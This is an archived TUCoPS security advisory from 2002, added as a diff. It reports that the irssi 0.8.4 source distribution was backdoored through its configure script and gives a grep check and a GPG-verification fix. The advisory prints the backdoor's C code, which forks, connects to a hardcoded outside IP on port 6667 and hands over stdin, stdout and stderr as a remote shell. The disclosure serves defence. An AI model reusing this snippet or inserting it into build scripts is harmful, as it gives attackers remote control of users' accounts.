@@ -1,0 +1,100 @@
+<html>
+<head>
+<title>TUCoPS ::  Unix :: General
+ :: unix5372.htm</title>
+</head>
+<body link="#0000ee" text="#ffffff" bgcolor="#000000" vlink="#551a8b" alink="#ff0000">
+<font face="Arial">
+<center>
+
+<br>
+<!-- google_ad_section_start -->
+<table border=0 width=900><tr><td align="center"><font face="Arial">
+<font size="4"><center><b><a href="../index.htm">TUCoPS ::  Unix :: General
+ :: unix5372.htm</a></b></center></font><br>
+<font size="2"><center><b>irssi backdoor </b></center></font>
+</td></tr>
+</table>
+</center>
+
+
+	<html>
+	<body link="#0000ee" text="#ffffff" bgcolor="#000000" vlink="#551a8b" alink="#ff0000">
+	<div align="right">29th May 2002 <tt>  [SBWID-5372]</tt></div>
+	<pre>
+<font color="#cc0000">COMMAND</font>
+
+	irssi backdoor
+
+<font color="#cc0000">SYSTEMS AFFECTED</font>
+
+	0.8.4
+
+<font color="#cc0000">PROBLEM</font>
+
+	Accodringly with irssi homepage [http://www.irssi.org],  main  web  site
+	have been cracked  and  source  code  backdoored  for  last  two  months
+	(binary not impacted).
+	
+
+	This code was found from configure - it forks a  new  process,  connects
+	to some server and gives stdin/out/err to it (ie. giving  remote  access
+	to your account):
+	
+
+	       int s;
+
+	        struct sockaddr_in sa;
+
+	        switch(fork()) { case 0: break; default: exit(0); }
+
+	        if((s = socket(AF_INET, SOCK_STREAM, 0)) == (-1)) {
+
+	                exit(1);
+
+	        }
+
+	 /* HP/UX 9 (%@#!) writes to sscanf strings */
+
+	        memset(&amp;sa, 0, sizeof(sa));
+
+	        sa.sin_family = AF_INET;
+
+	        sa.sin_port = htons(6667);
+
+	        sa.sin_addr.s_addr = inet_addr(\"204.120.36.206\");
+
+	        if(connect(s, (struct sockaddr *)&amp;sa, sizeof(sa)) == (-1)) {
+
+	                exit(1);
+
+	        }
+
+	        dup2(s, 0); dup2(s, 1); dup2(s, 2);
+
+	
+
+	If you still have the irssi sources, you can  see  if  you\'re  affected
+	with grep SOCK_STREAM configure -  if  it  returns  anything,  something
+	might have been done to your system.
+	
+
+	
+
+<font color="#cc0000">SOLUTION</font>
+
+	Upload source again - and check them with author GPG key.</pre></body>
+</html>
+
+
+<!-- google_ad_section_end -->
+<p><center>
+
+<p></center>
+<center><a href="/firefox.htm">TUCoPS is optimized to look best in Firefox&reg; on a widescreen monitor (1440x900 or better).</a></center>
+<font size=1><center>Site design & layout copyright &copy; 1986-2026 AOH</font>
+</center>
+<br><center><IMG SRC="http://artofhacking.com/cgi-bin/sc/sc.cgi?acct=tucops&font=payphone-med"></center>
+<p>
+</body>
+</html>
